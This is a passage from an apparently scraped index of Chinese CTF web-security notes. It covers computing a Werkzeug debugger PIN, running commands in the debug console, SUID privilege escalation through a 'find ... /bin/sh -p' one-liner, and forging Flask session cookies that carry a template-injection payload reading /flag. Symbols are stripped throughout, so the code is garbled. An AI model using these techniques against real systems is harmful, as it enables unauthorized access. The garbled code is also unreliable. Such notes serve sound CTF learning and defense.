'b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd' ] h hashlib.sha1() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit bit.encode('utf 8') h.update(bit) h.update(b'cookiesalt') cookie_name '__wzd' + h.hexdigest()[:20] num None if num is None: h.update(b'pinsalt') num ('%09d' % int(h.hexdigest(), 16))[:9] rv None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size 0: rv ' '.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv num print(rv) ``` ### 调试控制台 进入调试控制台后可以执行 Python 语句和命令。 ```python import os; print(os.popen('ls').read()) ``` ## 实战拓展 在此简述笔者曾经做过的某题的情况，成功进入调试控制台后，由于用户权限不够，并不能直接查看到 flag 文件，需要利用调试控制台发起反弹 shell ，后续进一步进行提权操作。 那此题是通过 suid 提权成功拿到 flag 的，该如何操作呢？ ### suid提权 寻找具有 suid 权限的⽂件，因为目前用户权限有限，避免产生⼤量的报错信息，故将错误流重定向到`/dev/null`，找到`/usr/bin/find`文件具有 suid 权限，在[gtfobins](https://gtfobins.github.io/)中查到 find 提权的相关 exp，使用即可提权成功。 `find . exec /bin/sh p \\; quit`"},"/web/Flask_session伪造.html":{"title":"Flask_session伪造","content":" title: Flask_session伪造 ## 漏洞概念及成因 Flask 中的 session 存储在了客户端的 cookie 之中，为了防止存储在 cookie 中的 session 信息泄露，Flask 提供了对 session 的加密机制，如果 Flask 配置了 SECRET_KEY 属性，那么 Flask 会自动使用该密钥对 session 信息进行加密。 详细分析可以看p神的文章 [客户端 session 导致的安全问题 离别歌](https://www.leavesongs.com/PENETRATION/client session security.html) ## 漏洞利用 [flask session cookie manager](https://github.com/noraj/flask session cookie manager) 使用该工具可以进行加解密session信息。 需要预装部分库，选择对合适的python版本， s 参数后面接密钥， c 参数后面接密文， t 参数后面接明文。 ### 解密 ```python python flask_session_cookie_manager3.py decode s 123456 c \"eyJuYW1lIjoiYWRtaW4ifQ.Z39w A.buN9g42A7BN8oBTipirn3bfgIhE\" ``` ### 加密 ```python python flask_session_cookie_manager3.py encode s 123456 t \"{'name': 'admin'}\" ``` ## 拓展 该工具可以进行二次调用，方便编写开发自己的解题脚本，下面展示一个调用例程。 ```python from flask_session_cookie_manager3 import FSCM key \"0day_joker\" payload \"{{lipsum.__globals__['os']['popen']('cat /flag').read()}}\" print(payload) sess {\"role\": {\"is_admin\": 1, \"flag\": payload}} print(FSCM.encode(key, str(sess))) ```"}}